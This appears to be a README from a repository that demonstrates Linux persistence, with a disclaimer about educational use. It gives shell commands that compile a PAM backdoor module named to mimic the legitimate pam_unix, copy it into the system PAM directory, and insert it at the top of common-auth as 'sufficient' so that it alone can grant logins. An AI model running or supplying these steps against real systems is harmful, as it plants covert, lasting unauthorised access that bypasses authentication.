# Linux-Persistence
For educational and research purposes only. This repository demonstrates concepts in an ethical context. The author does not support illegal use. Users are fully responsible for their actions. Use at your own risk. Provided “as is” without warranties or liability for misuse or damages.

# Compile
gcc -shared -fPIC -o pam_unix2.so pam_backdoor.c -lpam

# Install alongside legitimate PAM module
cp pam_unix2.so /lib/x86_64-linux-gnu/security/

# Add to PAM config (sufficient = if this succeeds, auth is granted)
sed -i '1s/^/auth sufficient pam_unix2.so\n/' /etc/pam.d/common-auth
